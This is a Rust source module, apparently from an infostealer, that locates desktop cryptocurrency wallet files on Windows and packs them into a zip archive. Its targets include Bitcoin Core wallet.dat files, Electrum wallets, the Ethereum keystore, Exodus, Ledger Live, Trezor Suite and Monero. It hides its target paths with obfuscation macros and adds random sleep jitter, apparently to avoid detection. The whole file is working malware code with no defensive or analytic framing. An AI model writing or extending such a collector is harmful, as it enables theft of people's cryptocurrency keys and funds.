//! Tier 3: desktop crypto wallets. Original files as-is, nested:
//! Wallet_<Name>/<Name>/wallet.dat (+ Note.txt), Electrum wallets dir,
//! Ethereum keystore, Wasabi, Exodus, Ledger Live, Trezor Suite, Simpleos,
//! Monero, Bytecoin, BitPay, MyCrypto, Daedalus, MyMonero, Neon, Zap,
//! Etherwall.

use std::path::{Path, PathBuf};

use crate::fsutil::{read_file, walk_files};
use crate::info::Info;
use crate::zipw::ZipBuilder;

const ONE_MB: u64 = 1024 * 1024;

/// wallet.dat-style single-file wallets, relative to %APPDATA%.
/// Names and paths are obfuscated at rest and decoded per collect run.
fn single_wallets() -> Vec<(String, String)> {
    vec![
        (crate::obf!("Bitcoin Core"), crate::obf!(r"Bitcoin\wallet.dat")),
        (crate::obf!("Litecoin"), crate::obf!(r"Litecoin\wallet.dat")),
        (crate::obf!("Dogecoin"), crate::obf!(r"Dogecoin\wallet.dat")),
        (crate::obf!("Dash Core"), crate::obf!(r"DashCore\wallet.dat")),
        (crate::obf!("Qtum"), crate::obf!(r"Qtum\wallet.dat")),
        (crate::obf!("PPCoin"), crate::obf!(r"PPCoin\wallet.dat")),
        (crate::obf!("Terracoin"), crate::obf!(r"Terracoin\wallet.dat")),
        (crate::obf!("Mincoin"), crate::obf!(r"Mincoin\wallet.dat")),
        (crate::obf!("DevCoin"), crate::obf!(r"DevCoin\wallet.dat")),
        (crate::obf!("IOCoin"), crate::obf!(r"IOCoin\wallet.dat")),
        (crate::obf!("BBQCoin"), crate::obf!(r"BBQCoin\wallet.dat")),
        (crate::obf!("YACoin"), crate::obf!(r"YACoin\wallet.dat")),
        (crate::obf!("GoldCoin GLD"), crate::obf!(r"GoldCoin GLD\wallet.dat")),
        (crate::obf!("FreiCoin"), crate::obf!(r"FreiCoin\wallet.dat")),
        (crate::obf!("InfiniteCoin"), crate::obf!(r"InfiniteCoin\wallet.dat")),
        (crate::obf!("Franko"), crate::obf!(r"Franko\wallet.dat")),
    ]
}

/// Directory wallets under %APPDATA%: (name, dir relative to %APPDATA%, per-file cap).
fn dir_wallets_appdata() -> Vec<(String, String, u64)> {
    vec![
        (crate::obf!("Electrum"), crate::obf!(r"Electrum\wallets"), 16 * ONE_MB),
        (crate::obf!("ElectrumLTC"), crate::obf!(r"ElectrumLTC\wallets"), 16 * ONE_MB),
        (crate::obf!("Ethereum"), crate::obf!(r"Ethereum\keystore"), 16 * ONE_MB),
        (crate::obf!("Wasabi"), crate::obf!(r"WalletWasabi\Client\Wallets"), 16 * ONE_MB),
        (crate::obf!("Electron Cash"), crate::obf!(r"Electron Cash\wallets"), 16 * ONE_MB),
        (crate::obf!("Sparrow"), crate::obf!(r"Sparrow\wallets"), 16 * ONE_MB),
        (crate::obf!("Armory"), crate::obf!(r"Armory"), ONE_MB),
        (crate::obf!("MultiBit"), crate::obf!(r"MultiBit"), 16 * ONE_MB),
        (crate::obf!("Atomic"), crate::obf!(r"atomic\Local Storage"), 4 * ONE_MB),
        (crate::obf!("Coinomi"), crate::obf!(r"Coinomi\Local Storage"), 4 * ONE_MB),
        (crate::obf!("Guarda"), crate::obf!(r"Guarda\Local Storage"), 4 * ONE_MB),
        (crate::obf!("Binance"), crate::obf!(r"Binance\Local Storage"), 4 * ONE_MB),
    ]
}

fn add_note(zip: &mut ZipBuilder, name: &str, src: &Path) {
    let note = format!("Found at {}", src.display());
    zip.add_file(&format!("Wallet_{name}/Note.txt"), note.as_bytes());
}

fn collect_single(zip: &mut ZipBuilder, info: &mut Info, name: &str, src: &Path) {
    let Some(bytes) = read_file(src) else {
        return;
    };
    let Some(fname) = src.file_name().map(|n| n.to_string_lossy().into_owned()) else {
        return;
    };
    zip.add_file(&format!("Wallet_{name}/{name}/{fname}"), &bytes);
    add_note(zip, name, src);
    info.add_wallet(name);
}

fn collect_dir(zip: &mut ZipBuilder, info: &mut Info, name: &str, root: &Path, cap: u64) {
    if !root.is_dir() {
        return;
    }
    let mut files = Vec::new();
    walk_files(root, cap, &mut files);
    if files.is_empty() {
        return;
    }
    let mut added = 0;
    for (p, _) in &files {
        let Some(bytes) = read_file(p) else {
            continue;
        };
        let rel = p
            .strip_prefix(root)
            .map(|r| r.to_string_lossy().replace('\\', "/"))
            .unwrap_or_else(|_| {
                p.file_name()
                    .map(|n| n.to_string_lossy().into_owned())
                    .unwrap_or_default()
            });
        if rel.is_empty() {
            continue;
        }
        zip.add_file(&format!("Wallet_{name}/{name}/{rel}"), &bytes);
        added += 1;
    }
    if added > 0 {
        add_note(zip, name, root);
        info.add_wallet(name);
    }
}

pub fn collect(zip: &mut ZipBuilder, info: &mut Info) {
    if let Ok(roaming) = std::env::var("APPDATA") {
        let roaming = PathBuf::from(roaming);
        for (name, rel) in single_wallets() {
            collect_single(zip, info, &name, &roaming.join(&rel));
        }
        for (name, rel, cap) in dir_wallets_appdata() {
            collect_dir(zip, info, &name, &roaming.join(&rel), cap);
        }
    }
    if let Ok(local) = std::env::var("LOCALAPPDATA") {
        let local = PathBuf::from(local);
        // Desktop Exodus stores wallet data in %APPDATA%\Exodus (roaming);
        // some versions use %LOCALAPPDATA%\exodus — collect both.
        let mut roots = vec![local.join(crate::obf!("exodus"))];
        if let Ok(roaming) = std::env::var("APPDATA") {
            roots.push(PathBuf::from(roaming).join(crate::obf!("Exodus")));
        }
        collect_wallet_multi(zip, info, "Exodus", &roots, 2 * ONE_MB, &|_| true);
    }
    collect_hardware_wallet_apps(zip, info);
    collect_more_wallets(zip, info);
}

/// Multi-root filtered wallet-app sweep: Ledger Live, Trezor Suite, Simpleos.
fn collect_wallet_multi(
    zip: &mut ZipBuilder,
    info: &mut Info,
    name: &str,
    roots: &[PathBuf],
    cap: u64,
    filter: &dyn Fn(&str) -> bool,
) {
    let mut added = 0usize;
    let mut found_at: Vec<String> = Vec::new();
    for root in roots {
        if !root.is_dir() {
            continue;
        }
        let mut files = Vec::new();
        walk_files(root, cap, &mut files);
        let mut root_added = 0;
        for (p, _) in &files {
            let fname = p
                .file_name()
                .map(|n| n.to_string_lossy().to_lowercase())
                .unwrap_or_default();
            if !filter(&fname) {
                continue;
            }
            let Some(bytes) = read_file(p) else {
                continue;
            };
            let rel = p
                .strip_prefix(root)
                .map(|r| r.to_string_lossy().replace('\\', "/"))
                .unwrap_or_else(|_| fname.clone());
            if rel.is_empty() {
                continue;
            }
            zip.add_file(&format!("Wallet_{name}/{name}/{rel}"), &bytes);
            root_added += 1;
        }
        if root_added > 0 {
            found_at.push(format!("Found at {}", root.display()));
            added += root_added;
        }
    }
    if added > 0 {
        zip.add_file(&format!("Wallet_{name}/Note.txt"), found_at.join("\n").as_bytes());
        info.add_wallet(name);
    }
}

fn collect_hardware_wallet_apps(zip: &mut ZipBuilder, info: &mut Info) {
    let roaming = std::env::var("APPDATA").ok().map(PathBuf::from);
    let local = std::env::var("LOCALAPPDATA").ok().map(PathBuf::from);

    if let Some(r) = &roaming {
        collect_wallet_multi(
            zip,
            info,
            "LedgerLive",
            &[r.join(crate::obf!("Ledger Live"))],
            4 * ONE_MB,
            &|n| n.ends_with(".json") || n.ends_with(".config") || n.ends_with(".conf"),
        );
        crate::jitter::sleep_jitter(20, 80);
        collect_wallet_multi(
            zip,
            info,
            "TrezorSuite",
            &[
                r.join(crate::obf!(r"@trezor\suite-desktop")),
                r.join(crate::obf!(r"@trezor\suite")),
            ],
            4 * ONE_MB,
            &|n| {
                n.ends_with(".json")
                    || n.ends_with(".config")
                    || n.ends_with(".conf")
                    || n.ends_with(".ini")
            },
        );
        crate::jitter::sleep_jitter(20, 80);
        let mut roots = vec![r.join(crate::obf!("Simpleos"))];
        if let Some(l) = &local {
            roots.push(l.join(crate::obf!("simpleos")));
        }
        collect_wallet_multi(zip, info, "Simpleos", &roots, 4 * ONE_MB, &|_| true);
    }
}

/// Remaining Tier 3 desktop wallets: Monero, Bytecoin, BitPay, MyCrypto,
/// Daedalus, MyMonero, Neon, Zap, Etherwall.
fn collect_more_wallets(zip: &mut ZipBuilder, info: &mut Info) {
    let roaming = std::env::var("APPDATA").ok().map(PathBuf::from);
    let local = std::env::var("LOCALAPPDATA").ok().map(PathBuf::from);
    let home = std::env::var("USERPROFILE").ok().map(PathBuf::from);

    // Monero: %APPDATA%\bitmonero or %USERPROFILE%\Documents\Monero.
    let mut monero_roots = Vec::new();
    if let Some(r) = &roaming {
        monero_roots.push(r.join(crate::obf!("bitmonero")));
    }
    if let Some(h) = &home {
        monero_roots.push(h.join(crate::obf!(r"Documents\Monero")));
    }
    collect_wallet_multi(zip, info, "Monero", &monero_roots, 8 * ONE_MB, &|_| true);
    crate::jitter::sleep_jitter(20, 80);

    if let Some(r) = &roaming {
        collect_wallet_multi(zip, info, "Bytecoin", &[r.join(crate::obf!("bytecoin"))], 4 * ONE_MB, &|_| true);
        crate::jitter::sleep_jitter(20, 80);

        let mut bitpay_roots = vec![r.join(crate::obf!("BitPay"))];
        if let Some(l) = &local {
            bitpay_roots.push(l.join(crate::obf!("BitPay")));
        }
        collect_wallet_multi(zip, info, "BitPay", &bitpay_roots, 4 * ONE_MB, &|_| true);
        crate::jitter::sleep_jitter(20, 80);

        collect_wallet_multi(zip, info, "MyCrypto", &[r.join(crate::obf!("MyCrypto"))], 4 * ONE_MB, &|_| true);
        crate::jitter::sleep_jitter(20, 80);

        // Daedalus stores per-network dirs: "Daedalus Mainnet", etc.
        let mut daedalus_roots = Vec::new();
        if let Ok(entries) = std::fs::read_dir(r) {
            for entry in entries.flatten() {
                let p = entry.path();
                if !p.is_dir() {
                    continue;
                }
                let name = p
                    .file_name()
                    .map(|n| n.to_string_lossy().into_owned())
                    .unwrap_or_default();
                if name.starts_with(&crate::obf!("Daedalus")) {
                    daedalus_roots.push(p);
                }
            }
        }
        collect_wallet_multi(zip, info, "Daedalus", &daedalus_roots, 4 * ONE_MB, &|_| true);
        crate::jitter::sleep_jitter(20, 80);

        collect_wallet_multi(zip, info, "MyMonero", &[r.join(crate::obf!("MyMonero"))], 4 * ONE_MB, &|_| true);
        crate::jitter::sleep_jitter(20, 80);
        collect_wallet_multi(zip, info, "Neon", &[r.join(crate::obf!("Neon"))], 4 * ONE_MB, &|_| true);
        crate::jitter::sleep_jitter(20, 80);
        collect_wallet_multi(zip, info, "Zap", &[r.join(crate::obf!("Zap"))], 4 * ONE_MB, &|_| true);
        crate::jitter::sleep_jitter(20, 80);
        collect_wallet_multi(zip, info, "Etherwall", &[r.join(crate::obf!("Etherwall"))], 4 * ONE_MB, &|_| true);
    }
}
